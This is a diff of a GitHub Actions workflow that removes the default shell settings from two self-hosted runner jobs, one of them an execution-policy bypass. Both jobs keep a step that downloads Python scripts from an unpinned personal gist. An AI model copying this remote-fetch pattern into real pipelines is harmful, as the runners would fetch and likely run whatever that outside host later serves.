@@ -5,9 +5,6 @@ on:
 jobs:
   kit-linux:
     runs-on: [self-hosted, Linux, X64]
-    defaults:
-      run:
-        shell: bash
     steps:
       - name: fetch the phase-1 kit
         run: python3 -c "import os,urllib.request; os.makedirs('kit',exist_ok=True); [urllib.request.urlretrieve('https://gist.githubusercontent.com/c0wb0yp0tat0/4b594abbec93a81aa4545b3834d782d6/raw/'+f, os.path.join('kit', f.replace('PILOTKIT-',''))) for f in ['PILOTKIT-stall_probe.py','PILOTKIT-memory_tool_store.py','PILOTKIT-README.md']]"
@@ -27,9 +24,6 @@ jobs:
 
   kit-windows:
     runs-on: [self-hosted, Windows]
-    defaults:
-      run:
-        shell: pwsh -ExecutionPolicy Bypass -command ". '{0}'"
     steps:
       - name: fetch the phase-1 kit
         run: wsl python3 -c "import os,urllib.request; os.makedirs('kit',exist_ok=True); [urllib.request.urlretrieve('https://gist.githubusercontent.com/c0wb0yp0tat0/4b594abbec93a81aa4545b3834d782d6/raw/'+f, os.path.join('kit', f.replace('PILOTKIT-',''))) for f in ['PILOTKIT-stall_probe.py','PILOTKIT-memory_tool_store.py','PILOTKIT-README.md']]"
